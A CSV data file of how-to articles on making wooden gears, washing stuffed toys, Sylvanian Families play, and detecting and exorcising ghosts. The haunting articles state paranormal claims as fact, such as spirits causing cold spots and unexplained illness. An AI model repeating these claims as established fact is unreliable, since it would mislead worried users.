headline,title,text
"
Receive access to a workshop.,
Gather the right plywood.,
Use safety supplies.,
Obtain a template.",How to Make Wooden Gears1," To make wooden gears, you should have access to a wood work studio. You’ll need access to a band saw or jigsaw, an awl, brad point drill bits (5/16 or 8mm), and a wood rasp. You’ll also need access to a printer, a smooth shank, and short wood screws.;
, You’ll need to use Baltic birch plywood because it is very durable. You’ll recognize this type of plywood based on the several layers within the wood. You could alternatively use UHMW plastic, Masonite, or phenolic resin material.


Avoid using spruce or fir plywood because it is simply not strong enough., When handling this type of equipment it may be wise to use some safety precautions. First, never allow a young child to operate any large machinery unsupervised. Though it is not required, wear safety glasses while operating the larger machines. There’s a chance of a small scrap of wood to pierce your eye.

, Go online to a free wood generator like https://woodgears.ca/gear_cutting/template.html for your template. A generator like this allows you to modify all the aspects like tooth spacing, number of teeth, number of spokes and more. When you’ve created the right sized gears, print them off. Templates generally have two different sized gears. The template will allow you to make size adjustments without messing up the gear ratio. The template is designed to adjust both large and small gears together. The teeth will be the same size for both sized gears to ensure a smooth rotation.


Generators like this even let you animate your design to test how it works.
There are more sophisticated gear templates that are available for download as well.
You can also create your own template using paper, pencil, and a protractor.

"
"
Wash the soft toys as usual.,
Find a large safety pin for each animal washed.,
Pierce an ear or other easy part of each animal with the large safety pin.,
Leave to dry.,
Remember to remove the pin and close it before bringing the toys back inside.",How to Dry Soft Toys on the Clothes Line,";
, You will probably have some in the sewing basket or stash of baby's things but if not, get some from the craft store or the haberdashery section of a general store.

, Thread the rest of the pin over the clothes line and pin into place.

, The safety pin will keep the soft toy hanging easily and there won't be any marks, damp spots, or falling soft toys.

, Forgotten pins can cause harm to young children.

"
"
Cut out your templates.,
Glue the schematic to the wood.,
Cut out the wood.,
Punch divots into each tooth.,
Drill holes in between each tooth.,
Prepare your band saw.,
Cut out your gears.,
Remove the outline.,
Add wood varnish.",How to Make Wooden Gears2," After printing out your template onto paper, you’re ready to cut out the template. There is no need to individually cut out a slot for each gear on paper. Simply cut out the full circumference of the circle with the gear’s teeth intact. Do this for both gears.








, Once the paper templates are cut out, you’ll need to attach them to the plywood. Use wood glue for the best hold. You shouldn’t use standard glue because it won’t stick as well to the wood.









It is important that the schematic stays intact while you make your cuts.Allow around an hour for the glue to dry and settle to ensure nothing will mess up.

, Once your schematic is glued onto the plywood, you’re ready to cut out the plywood’s circumference. Use a band saw or a jigsaw to cut out the full circle. Be sure not to puncture any of the gears. To be safe, it is better to cut out a larger circumference than your design calls for.








If you are inexperienced working these types of power tools, ask for assistance from an experienced woodworker. Typically work studios have technicians that are there to assist. Utilize the resources around you.

, You’ll need to use an awl which is a tool with a pointed spike. Use an awl to puncture small holes (or divots) in between each tooth. Position the awl above the line between the teeth. Once the awl is in place simply bang on its butt to create a divot into the wood.









This will act as your guide for when you use your drill., Now that you have outlined where each hole will be, it’s time to create the initial holes to guide your future cuts. Use a 5/16 brad point drill for each hole. Go along the gear's rotation and create a hole using the divot created earlier as a guide. Align the drill onto the divot and commence drilling.









It’s okay if the drill holes vary from the template’s design.Again, seek out someone with experience if you’re unsure how to use the tool.

, You’ll need to make the teeth cuts at an angle for the best rotation. Tilt the table holding the wood slightly when making the cuts for the teeth of the gears. Tilt the table to the right when cutting the left lines. Then tilt the table to the left when cutting out the right lines.









If your band saw table doesn’t let you tilt to the left, you can prepare it to work. Insert a piece of plywood underneath the spacer to create a left angle., You can either use a bandsaw or a jigsaw to make the final cuts for the teeth. Take time to do one side at a time to create the proper angles that will produce a smooth gear rotation. Start with right line of each tooth and cut the lines at an angle to the left. Then adjust your angle to the right and cut out all the left lines.









Assure that the outer lines match the lines on the template. Cut out parts of the wood that extend beyond the template's line when finished. Do this if you were cautious and cut out a circumference larger than your template.
Use your drill to cut out the center hole where the gear will rotate around., Use a belt sander to remove the template from the gears. You can also chip it off using a flathead screwdriver or even use sandpaper. The belt sander can be a messy process and shouldn’t be handled by someone inexperienced.








, Apply a coat of wood varnish around the teeth and on the base to ensure the wood doesn’t decay. Start with one coat and add another coat after testing the gears and ensuring everything works."
"
Attach a handle.,
Connect the gears.,
Test the gears.",How to Make Wooden Gears3," Use your wooden shank as a handle for the larger gear. If you don’t have a smooth shank you can use any piece of spare wood available to you. Position the shank on the outer part of the gear without overlapping into the gears, and then attach it using wood glue. Add a small wood screw to ensure a secure connection.







, Connect the gears to a contraption like a box joint in order to test them properly. If you don’t have a contraption already built, you can create your own test contraption. The key is for the smaller gear to be positioned vertically and the larger gear to be at a 90 degree angle. You can create stands out of spare wood that attach to the gears at their center point.







, Ensure that there isn’t any place where the gears seem to struggle. Take note of any location where there seems to be a resistance with a pencil.









If your teeth are of unequal size, you'll have to remove some material from the groove between the teeth.Use your wood filer to file away any resistance you experience as the gears turn.

"
"
Listen for sounds.,
Feel the temperature.,
Consider how you feel.,
Listen for knocking.,
Check the animals.,
Notice any disturbances.,
Consider any illness signs.",How to Verify Signs of a Haunting," Phantom sounds can take the form of voices, music or repetitive noises that occur at regular intervals. The characteristic sound of footsteps in the night, laughing, crying or music that occur at regular intervals are attributed to a residual haunting. Intelligent or inhuman spirits may create sounds to get your attention or to communicate with you in some way. You may experience the sounds of knocking, tapping or scratching in the wall or loud crashes and bangs with no identifiable cause. Each is characteristic of specific types of hauntings.;
, Cold spots with no physical reason often accompany hauntings. The theory is that spirits need energy to manifest and draw energy from the surroundings, resulting in an area colder than the surrounding air by as much as 20 to 40 degrees. The cold spot seldom remains in one area for a prolonged period and may precede a manifestation or other paranormal activity.

, Unusual physical sensations may signal paranormal activity. Dizziness, light headedness, a feeling of oppression or pressure on the chest, or nausea may suddenly become overwhelming when a spirit is present. Other physical sensations include the feeling of being touched, the feeling of being watched, hair standing on end or extreme apprehension.


Unusual or unexplained physical and/or emotional feelings: experience being touched by something that cannot be seen, either lightly or with more aggression. In addition, clients frequently report the sensation of being watched by something unseen and the latter assertion is not in conjunction with any form of paranoia.

, Rapping and banging: unexplained banging, rapping, and strange sounds are commonly reported by individuals experiencing paranormal phenomena. Rapping and banging are also commonly reported on sites experiencing poltergeist activity.

, Animals behaving strangely: people are not seemingly alone when it comes to experiencing the paranormal; many animals living in haunted locations or locations where activity occurs also experience paranormal activity.

, Sudden unexplainable activity after recent remodeling of the location: A large number of the sites investigated by paranormal investigators in the field have been remodeled prior to the commencement of strange, unexplained activity. Some theories suggest that remodeling and paranormal activity is inextricably linked, and one theory suggests that any spirits/entities attached to a location are displeased with the changes that remodeling produces so they act out accordingly. Meanwhile, other theories suggest that remodeling creates noise disturbances, and therefore is simultaneously creating vibrational disturbances as well.

, Physical illness with no medical relief or reason: In some cases, individuals will report having the sudden onset of rare illnesses, or un-diagnosable ailments after moving into a location that is paranormally active. Lesser signs of illness are also reported and include sleep disturbances, fatigue, and general malaise with little or no relief while in the location in question. When the individual is free of the location however, the latter symptoms either fade or disappear all together.

"
"
Try to get a house for them as it makes it more fun as they can do things like eat, sleep and many more.,
Have the children figures make best friends with each other.,
The adults can also make friends.,
The families can go on holidays and day trips together.,
Buy the school!,
Buy the nursery!,
Give the adults jobs.,
Feed the Sylvanians!,
Let them sleep at night!,
Make things for them such as clothes and furniture.

,
Make dioramas or something similar to present them in.

",How to Play With Sylvanian Families," It doesn't need to be a fancy one like the hotel, a little one like Daisy cottage will do. If you can`t buy a house, use a cardboard box and make a bit of furniture for it. Now you can start playing!;
, If you have more than one house they can go to each others for sleepovers, lunch or dinner, to play, to camp together, etc. They can also sit next to each other at school.

, The mums can go on shopping sprees while the dads go round each others and watch the football. The same for uncles, aunts, grandmothers and grandfathers.

, They can go camping, go to the seaside, the farm, on the boat, the Grand Hotel even! You can get cases for them in certain sets like the hotel, the family cars and the guest room furniture set. If not, you can make them or buy them at a doll house store like the Doll House Emporium.

, The most recent one is Berry Grove. It comes with 12 chairs so 6 can go on the ground floor and 6 can go on the top floor. Buy one of the lesson packs if you have more than 12 children or you get given Sylvanians often as the school fills up very quickly! Here is everything you can buy for the school: the school sports day set, the dinner lady and lollipop man, the school pupils set. The school dinners set, the school nurse and accessory set, the school play set and the music lesson set with the teacher. You can also buy some other sets online. You can have children pack their backpacks and go to school on the bus or have them walk. They can have their lessons and play outside. Don`t let them forget their pack lunches or dinner money!

, You can buy a bus, a playground and the toilets for them. Send them to school on the bus with their pack lunches, they can read books, build with blocks, learn their A B Cs and have music lessons once they get there. They can eat their lunch and play in the playground too!

, Try to give them jobs that they do if you can(this can be found on the back of the boxes that the families come in or on the website). Like Matilda Billabong works in the nursery, so Try to give her that job. Daisy Buttercup is very chatty, so a shop job would work well. The Buckley parents are school teachers, etc.

, Good food packs are the breakfast set, the scrumptious sandwiches set, the dinner for 2 set, the kitchen cookery set and the lunch set. You can also buy the Blackcurrant Cafe and the Courtyard Restaurant and shops like the cake or sweet shop.

, You can buy bedroom sets like the children`s bedroom set, the triple baby bunk beds and the master bedroom set.

,,"
"
Determine if the haunting is a valid case.,
Investigate to see if anything seems out of the ordinary.,
Try to find rational reasons for what is happening.,
Locate some help in proving your house isn't haunted.,
Keep a journal and a tape recorder by your side.,
Do historical research.,
Contact a paranormal investigator.,
Follow the guidance of investigators.",How to Tell if Your House Is Haunted," There are different levels of phenomena in hauntings because they aren't all the same. There can be single phenomenons and many different phenomena in hauntings. ,


Listen for any other voices or noises if you are home alone. You will most likely hear these sounds in the distance. Some sounds you might hear in a haunted house would be footsteps, knocks, banging, rapping,slamming, scratching sounds, or sounds of something being dropped. These noises can range from quiet to extremely loud. Check to see if you ever find doors opened or closed when you are certain the door wasn't positioned like that before. Also, look for electrical items turning on and off unexpectedly. You will probably not witness this type of phenomena taking place. Discover if items are disappearing and reappearing. Look in a certain spot for something that is always there; if it's not, keep your eyes open. Usually, the item will be found in an obvious spot ranging from a day to a few weeks. It would be as if someone or something took an object for a while, then returned it to its normal spot. Check for unexplained shadows. This means you might be seeing shapes and shadows from the corner of your eye. The shadows will probably be similar in form to a human, but sometimes they can be smaller and hard to distinguish. Notice if you feel like you're being watched or touched by someone or something that isn't visible. For example, something might brush up against your arm when you are standing in an empty room. An extreme and very rare example would be getting slapped or punched by the invisible someone or something. Listen for muffled cries and whispers. You might hear music playing from an unknown area or your name being said by someone or something who isn't there. Look for moving objects. Some examples would be dinner plates moving across the table, pictures falling off walls, and furniture sliding across the floor. Pay attention to cold spots as some believe that this means there is a ghost in the room.

Pay attention to unusual smells (i.e. perfume, smoke, flowers, food) that come from nowhere or out of the blue.


, It may be hard to dismiss some of the more extreme phenomena. The phenomena will most likely be taken more seriously if more than one person witnesses it happening.

, The local plumber might be able to help you explain why there are banging noises around the pipes. Carpenters can fix tables that wobble on their own or doors that close by themselves. Family or friends might be able to offer new explanations for why you are hearing or seeing a certain something. , Write down the date, time, and what the phenomena did in your journal when something unusual happens. If you are hearing strange noises a lot, it is good to record what you hear on the tape recorder for evidence. By doing this, you will be able to help out the paranormal investigators if you would like them to come to your house. , Haunted houses are usually the site of a historical tragedy of some sort. Find out who has owned the house before, and if anything unusual has happened in that home. A good reference librarian, your town hall, historical society, even history teacher can help get you started.


Contact the people who have lived in your house before you. Ask them if they ever noticed anything unusual, strange, or unexplained behavior while they were living there. If multiple people have lived in your house before you, be sure to contact as many as possible.


, Have them visit your house, and ask them if they notice anything unusual. Only call one if you are very certain your house is actually haunted. If you believe that your family may be in some kind of danger with the phenomena being in your house, don't be afraid to call for help as soon as possible. , If your house turns out to be haunted, then listen to what others tell you to do. If you don't like your house being haunted, try sprinkling holy water in the areas that seem most haunted.

"
"
Make sure the haunting has not been caused by infrasound.,
Eliminate other non-supernatural factors.,
Get psychiatric evaluation.,
Record your experiences.,
Have someone corroborate your findings.,
Don't be disappointed if your haunting turns out to be nothing.,
Be confident when dealing with your ghost.,
Perform an exorcism.,
Cleanse the house.",How to Get a Ghost out of Your House," These low frequency hums can cause nausea, feelings of fear and even manifest shadows at the corners of your vision. These are caused by the vibrations of the infrasound, depending on the intensity of the sound wave. French robotics researcher, Vladimir Gavreau, allegedly produced such effects on himself and his fellow researchers through infrasound.Animals can pick up infrasound in ways that humans can't. Scientists believe that this might be how many animals can sense natural disasters.Building an infrasonic microphone. The antenna itself has to be bought, but these are easy to find at an electronics store and relatively inexpensive. Once you have the microphone, get a glass jar with the diameter of 2.25 inches (5.7 cm). Stretch a 12 inch (30.5 cm) balloon over the touch. Cut off the part of the balloon which you use to inflate it, and tape the rest tightly and without wrinkles to the jar. Tape an NdFeB type magnet of 1⁄2 inch (1.3 cm) to 1 inch (2.5 cm) diameter magnet of 5000 gauss or more (you can get this from Walmart). You will need an oscilloscope to convert the electrical signals into waveform patterns. These are more expensive, but can be found for about $45 on eBay.Alternately, call your local university's science department and see if they have any recommendations for putting together an infrasonic microphone.;
, Check around where the house is situated. Is there a garbage dump nearby? Sometimes methane gas can seep up through the ground, giving a smell of brimstone and bursts of fire.Often ghost sightings are simply light bouncing off of a reflective surface in an unusual way. Human sight and senses are incredibly error prone, so it can be difficult to trust what your eyes might be telling you without serious further investigation.

, Often people who see ""ghosts"" are primed to do so because of their mental health. Before you start doing odd things to your home, seek out some professional help. This doesn't mean that you don't have a ghost, it is simply a way to rule out one outside possibility.


Likewise, try to have someone confirm your experience. If you're the only one seeing or sensing anything, that's the best time to get psychiatric evaluation. If others experience the possible haunting as well, look first to other natural causes.

, Once you've gotten rid of any natural causes, you will need to catalog your haunting to better understand how to deal with it.


Use a record player to try to communicate with the haunting. Ask it questions and record it to see if the ghost answers. It won't always, but you may be given some sort of message which can help with getting rid of it. You will want to ask easy questions with simple answers, usually yes or no. This is simplest if you try to communicate with the ghost by asking questions and having it answer with knocking. Ask it to use one knock for yes and two knocks for no.
Take photos of the areas where you experience the haunting to see if anything turns up in the final image. Use a flash when you're in a dark space, like a room, otherwise your camera will only capture darkness. Otherwise, it is best to rely on natural lighting so that lens flare doesn't confuse you. Remember that often ghostly seeming orbs and other phenomena are often simply dust on the camera lens, or light refracting from dust particles in the air.

, See if your family members, or roommates sense and see similar things to you. Do they hear ghostly footsteps, a knock on the bedroom door, or other manifestations? Try not to influence them with your own findings.


If you can find a reputable ghost hunter or psychic, talk to them about what you've discovered and see what they think. If you can afford it, have them come to your house and see what they can find separate from your experiences.

, As any reputable ghost hunter will tell you, most of the ghostly visitations turn out to have a natural explanation. That doesn't mean ghosts don't exist!

, Like animals, ghosts are supposed to react to and feed off of fear. Since there are very few (if any) true cases where someone was hurt by a ghost, mostly what you'll be dealing with is irritating and possibly unsettling.


If you talk to the ghost, use a no-nonsense tone of voice, as you would with a misbehaving animal. Be stern, but not mean. Ghosts may be the left-over spirits of other people. The fact that they are dead might already be traumatizing to the ghost.

, This is specifically for Christians, as an exorcism means casting out Satan and his minions. If you aren't Christian, this way will be unlikely to work for you. Check in your specific religion, as all religions have possibilities for dealing with a type of spirit world. If you are Christian, don't perform the exorcism yourself. Instead, contact a local church and see what they recommend.In Hinduism reaching the 3rd, 7th and 9th chapter of the Bhagavad Gita and offering the result to the ghost it will help release them from their bondage. Likewise, chanting mantras, keeping holy pictures of deities or burning incense offered during a Puja can help release the trapped spirit.
The Jewish ritual helps both the possessed and the possessor find healing. The ritual should only be performed by a rabbi who has mastered practical Kabbalah.
There are a variety of banishing rituals for all cultures and religions so you should be able to find one that suits your need. These rituals take into account different culture's views on ghosts and the afterlife, as there is no one true doctrine on ghosts.

, Once your ghost has been banished, you must cleanse the space so that it doesn't return and to discourage other spiritual and ghostly visitors. Again, there are as many ways to cleanse a physical space as there are religions in the world. The ones offered below are only some of the more common ones.


Burn sage or cedar. This is said to clear negative energy and burning incense is considered a purifying force in many cultures.
Ring a bell in each corner of your home. This is said to break up the negative energy and encourage positive energy. It is important to do this more than once as negative energy can come from many different sources.
Physically clean your home. This will help to create an atmosphere of cleanliness and to discourage negative energy from coming back.

"
"
Take a well-built guard dog like German shepherd with you into the house.,
Remind yourself that before you move anything into the house, walk through the entire place.,
Remember: before moving all of your stuff into the place, move in as few items as possible at first.,
Keep in mind while moving furniture or other objects in, be alert for any feelings you may have about where an item should be placed.,
Try to relate to the ghost by talking about what life may have been like in the house (if it is an old house), and try to do something former residents would have done in the house while they lived there, like eating some meals in a formal dining room, or listening to period music from the time the house was built.

,
Try to talk about big events that would have happened while past owners would have been living there.,
Avoid the area the ghost is in, if (s)he is in one particular place.,
Try to spend a night in the place.,
Accept the ghost.,
Talk to the ghost.,
Remember if the ghost does something scary, let it know you are upset, and that if such behavior continues it will not be tolerated.",How to Live in a Haunted House," The reason? Dogs easily detect the presence of the spirits. It will be daring to you also with the dog.;
, Doing this will give the ghost(s) a chance to scope you out, and accept your presence in 'their' home.

, This will avoid riling the ghost(s) to the changes going on during the transition from former occupants.

, If you can make a ghost happy by placing a chair in a particular place, it could save you lots of trouble later on.

,, For example, on October 29 of a year, try to talk about how past residents would have felt about the stock market crash and the beginning of the Great Depression (if the house is old enough).

, Try using the room as a storage area and leave the ghost alone.

, Some ghosts try to communicate with the living through dreams. Allowing the ghost to get its message to the living may put an end to the haunting and send the ghost on its way.

, While this may be difficult for some to do, most ghosts will leave you alone if you acknowledge their presence.

, Let it know it is welcome to stay if it leaves you and your family alone.

, Some ghosts can be persistently aggressive and this behavior may prevent you from sleeping or enjoying your home life the way you deserve to. If this happens, never respond in anger. This will only add fuel to the fire. Focus on feeling love for these entities that probably haven't felt love in a very long time (if ever). Directing positive energy toward them can be surprisingly effective in stopping unwanted behavior.

"
"
Remove the reborn doll's clothing.
,Find a small bowl and two face cloths.,
Tip some lukewarm water into the bowl.,
Dip the first face cloth into the lukewarm water.,
Wipe the doll's face gently.,Wipe the doll dry using the other face cloth.,
Restore the clothes to the doll.",How to Clean Your Reborn Doll,",, Do not use hot water, as this may damage the doll., Wring out as much water as possible., Then wipe its arms, legs and, if it has one, belly plate. Do so gently, to avoid scratching the doll, especially its face.,, It should be nice and clean now."
"
Keep an eye out for typically paranormal behavior in your house.,
Rule out the obvious causes of ""other-worldly"" noises and issues first.,
Take an honest appraisal of your own health and stress levels.,
Ignore the alleged spirits as much as possible, not even giving them a passing thought.,
Have a religious leader, medium, or psychic examine the house if you are still unsure.",How to Exorcise Your House or Dwelling1," There are a lot of different signs and ideas behind spirits, and determining if your home possesses one is often the hardest thing to do, as the signs can be confusing and conflicting. What is important to remember is that very, very few houses are every possessed, and even fewer are visited by ""evil"" spirits, contrary to what Hollywood seems to think. Look out for:


Moving or disappearing and reappearing possessions, especially similar objects or the same object.
Electronics turning on and off on their own.
Unknown footsteps, doors/windows opening and closing, strange noises or voices.
A feeling like you are not alone ever, often combined with chills and sudden fear or panic.
Specific or recurring nightmares, especially those that seem to direct you to do something.
Extremely hot or cold spaces in the house, often confined to small areas.;
, This is the only way to keep your peace of mind if things get a little strange. Be scientific here, systematically examining or exploring where unknown noises or lights show up. No matter what you believe, a large dose of skepticism is healthy here. The need for exorcisms is rare -- and there are almost always common explanations for most ""unexplainable"" phenomenon.


Houses, no matter how old, all ""settle"" over time. The pieces shift and groan, boards move, and pipes whistle and bang. Older houses do this constantly, and this is the source of most noises.
Strange odors and smells commonly come from leaks or trapped moisture somewhere, especially after rains or floods.
Open windows, cleaning, and plain bad communication are the cause of most missing objects, not spirits.

, No one wants to be told ""it is all in their head,"" but that's why you simply must be honest with yourself when determining if it is a spirit or not. If you're already stressed out, not sleeping well, having trouble eating, or feeling generally under the weather, you are more likely to see and feel things out of the ordinary. Don't let the worry of a spirit ruin your mental and physical health -- keep taking care of yourself and spend some time relaxing. If the spirits fade away, they were likely the result of an overworked, overtired brain and body.

, What happens if you push the spirit out of your mind, since we frequently only see ""signs"" of ghosts and demons when we're looking for them? Remind yourself how rare these spirits really are and that anything you're worried about is likely a common occurrence or noise. Try to let the idea of a spirit ease off your mind. If things still happen or occur more rapidly, you might have an issue to investigate. More often than not, however, the ""spirits"" will disappear as soon as you stop thinking about them.


If there are spirits, they generally need and feed off of your attention, looking to make themselves known. Ignoring them generally keeps them in check if they are actually present., If you are under a lot of emotional and psychological stress because of a perceived spirit, open up to your spiritual leaders and ask their opinion and advice. You may want to consider inviting a psychic/medium to your home to ""have a look"" and determine if you need extra help. Oftentimes all the house needs is a quick energy clearing with a smudging stick or some incense.

"
"
Setting It Up
,
Decorate your house plainly and insert he 'evidence' for the murder.,
Lay out your Sylvanians and choose who you and your friends want to be.,
Roll your dice twice and add up the two numbers.,
Roll the dice again, but only once this time.,
Place your other Sylvanians (not the ones you've selected) wherever you like.,Playing the game,
If you have stairs in your house, roll a dice for each player.,
The youngest player goes first by rolling the dice.,
After each player has had two goes each (or if each team has had 2 goes each), you are allowed to move other Sylvanians.,
When you move the murderer, you have the option to murder somebody.,
If you enter the room where the original, first murder was, you have to miss a go.,
When you play the game for a while, you may find that your Sylvanian characters get murdered.,
To win the game, you must be at a stage where there is only one character and the murderer.",How to Play Cluedo With Your Sylvanian Families,", They can be anywhere you wish, but make sure it looks okay with the rest of the room, a bucket and spade in the bathroom might look a bit weird!, If there are a lot of you, you might want to form teams., Whichever number it was, that Sylvanian is your murderer. Place them wherever you like., That Sylvanian is the murdered person. Place them anywhere, but make sure they look dead!, Try to have it so that there is one in each room. Be careful where you place your Sylvanian figures. Making the murderer stand out won't work very well- you'll see quite soon.,, That player's Sylvanian must stand on the number stair that was rolled on the dice. (e.g. if you roll a 4, the Sylvanian must stand on the fourth stair) If you have no stairs, stand your figures outside the house., Each number is a room. So, if a 5 was rolled, they would go through five rooms and stop in the fifth room. If you land in the room the murder is in on your second go (per 2 goes and then the murderer's turn round), you are dead, unless somebody else is in the room with them., This means you can roll the dice and move a Sylvanian to another place, using the rules you could normally do., You move as normal, but if the murderer is alone with jut one person when they enter a new room, they can murder somebody. Roll the dice to justify whether or not they should be murdered. If the dice displays a number of three or under, the Sylvanian will be a murder victim. If the number is over three, nobody is murdered that time around., The only way you can get out of it is if there is already somebody that is not dead) in that room., When all your own characters are murdered, they can come back into the game., You roll your dice as usual, and when you enter the room in which the murderer is in, you roll the dice again. If the number is under three, the murderer has killed you, and if over three, you have won!"
"
Determine that the stuffed animal is suitable for washing by machine.,
Determine what sort of washing machine you have.,
Remove any removable parts from the stuffed toy before washing.,
Find a pillowcase that is large enough to contain the stuffed animal.,
Place your stuffed animal into the pillowcase.

,
Tie the open end with some twine or yarn.,
Place the tied pillowcase into the washer.

,
Wash on the gentle cycle.,
Remove from the washer when the washing cycle is done.

,
Dry gently.,
Brush or finger sweep the nap when dry.",How to Wash a Stuffed Animal in the Washing Machine (Gentle Dry Method)," Some stuffed animals will be destroyed by being placed in the washing machine, while others will come out just fine.


Stuffed animals likely to cope with the washing machine include (with the proviso they don't fall into the next category): New to fairly new stuffed animal toys, strong stuffed animals, stuffed animals in good condition without threadbare or loose elements, stuffed animals without
Stuffed animals that cannot be washed in the washing machine include: antique or vintage toys (they're too delicate); those containing any form of music or sound box (it won't work after water goes into the squeaker/music maker); toys with delicate features or glued-on things such as sequins/rhinestones/glitter, etc.; toys containing Styrofoam balls; and any toy that has rips, threadbare areas or looks ready to split.


Realize that a stuffed toy will change in appearance post washing, whether done by machine or by hand; it is the nature of the materials from which it is made. If this is a concern for you, consider dry washing or spot cleaning, or speak to a toy conservator about any special methods that might work.;
, For the sake of a gentle wash, a front loader will give a kinder wash to your stuffed toys than a top loader with an agitator column. In the case of using a top loader, it's a good idea to include clothing as a buffer against the agitator constantly banging against your stuffed toy during washing.

, Some parts risk coming loose during the machine wash, while other items such as clothing and bows are better washed separately. Determine whether or not any of the removed parts also need washing; if so, they are likely best washed by hand or spot cleaned.

, It will need to include sufficient space for closing and tying off as well.


Alternatives to the pillowcase include a mesh bag used for delicates or a lingerie washing bag, again used for delicates. The downside to this may be size, depending on how large your stuffed animal is. If very larger, resort to the pillowcase.

,, This will ensure that the bag is firmly closed, preventing the stuffed animal from falling out of it. When tying, be sure to enclose the stuffed animal such that it cannot move around with the pillowcase but is held very firmly.

,, The water should be no hotter than the warm setting.

,, Either place the stuffed animal on a porch out of direct sunlight or balance it somewhere in the laundry to drip dry. Do not place in the dryer; the synthetic elements are liable to melt, shrink or change shape and your stuffed animal will not look the same again.

, After washing, the stuffed animal probably won't look exactly as it did prior to washing. However, you can use a baby brush (very soft bristles) or your fingers to brush or comb down the nap in the right direction again, making the ""fur"" look normal again. As well, make any other needed adjustments, such as tying back bows, adding back removed elements and putting clothing back on, where relevant.

"
"
Protect yourself by wearing religious or spiritual talismans close to you.,
Firmly ask the spirit to leave, avoiding anger or fear.,
Light a sage smudge stick, carrying around the house and waving in a clockwise motion.,
Spread a little holy water around the house.,
Call upon the prayers of your faith or use common religious prayers against spirits.,
Leave out Kosher salt or raw rice, two substances thought to drive away spirits and malicious energies.",How to Exorcise Your House or Dwelling2," From the Star of David to the West African gris-gris, almost all cultures have items and clothing used to protect the wearer from spiritual attacks. Make sure you choose something you actually have faith in. There is not much use wearing something if you don't believe in it at all, as it is stripped of any use or power.


Keeping several of these items in the house can also help ward off spirits, such as crosses above the door or shrines to benevolent gods and spirits., This is the most common practice, and should be repeated frequently, especially during a cleansing or exorcism. The reason to avoid fear or anger is two-fold: it both keeps your calm (and thus effective) and prevents the spirit, if it is there, from deciding you're a threat to its safety.


Try out the Latin rites, as well: ""Ecce crucis signum, fugiant phantasmata cuncta.""(translates as: “behold the emblem of the Cross; let all specters flee”).Let the spirit know that you mean it no harm, but that the physical world ""is not their place anymore."" Assure them that the spirit world awaits them and they will be safer there.
Remember, spiritual possession is not necessarily ""evil."" Most spirits are simply lost, confused, or still clinging to life, and will leave when asked., These sticks have been used for centuries by shamans and religious leaders and are one of the few tools used by many different faiths. There is even some scientific evidence that smudge sticks promote mental well-being and feelings of calm and pleasure, and the practice is widely used to both protect and fight spirits. When smudging a house, crack open a window and take your time -- let the smoke calm you and the room, slowly directing it to fill the room.


Smudge sticks are simply long bundles of sage leaves and stems tied together into a rod of sorts, then lit on the end. You can also crush the dried sage in a small bowl and light this instead, carrying it around to smudge the house.
Some cultures use ceder in place of sage, but both can be used, as well.
Let the smoke fill the room, especially any rooms where paranormal activity is felt.

, You can get holy water at most Catholic churches, though it helps if you are a practicing member of the faith. Sprinkle it in the corners of rooms, at door and window frames, and any areas where you experience the most physical paranormal activity.You can still get holy water at many churches. Call ahead to make sure they bless water there.

, There are as many different prayers to ward off evil as there are faiths, so you should choose the one that speaks most deeply to you. Don't underestimate this connection -- if a prayer feels useful and powerful, use it. Some common prayers include:


The Lord's Prayer
Archangel Michael's Prayer of Protection
The Serenity Prayer
Personal mantras asking the spirits to leave, If you do, you need to leave a window or door open, as the spirit needs a way to flee the room. If performing prayers or continuing to ask the spirit to leave, repeat these rituals as you spread the salt or rice.Remember that your conviction when doing this is important -- if you are fearful or half-hearted, you will not see any results.

"
